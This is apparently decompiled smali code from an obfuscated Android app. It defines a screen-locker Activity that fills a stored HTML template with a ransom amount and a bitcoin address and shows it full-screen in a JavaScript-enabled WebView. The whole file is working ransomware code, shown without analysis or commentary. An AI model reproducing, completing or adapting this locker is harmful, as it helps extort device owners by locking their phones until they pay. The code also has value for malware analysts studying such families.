.class public Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;
.super Landroid/app/Activity;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$ifdf;,
        Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$for;
    }
.end annotation


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;->fddo:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v0, "htmllocker"

    invoke-virtual {p1, p0, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v1, "lock_amount"

    invoke-virtual {v0, p0, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v2, "lock_btc"

    invoke-virtual {v1, p0, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "<amount>"

    invoke-virtual {p1, v2, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "<bitcoin>"

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    new-instance v0, Landroid/webkit/WebView;

    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    new-instance v1, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$for;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$for;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$fddo;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    new-instance v1, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$ifdf;

    invoke-direct {v1, p0, v2}, Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$ifdf;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker;Lnaqsl/ebxcb/exu/Activity/ActivityScreenLocker$fddo;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    const-string v1, "text/html"

    const-string v2, "UTF-8"

    invoke-virtual {v0, p1, v1, v2}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    return-void
.end method
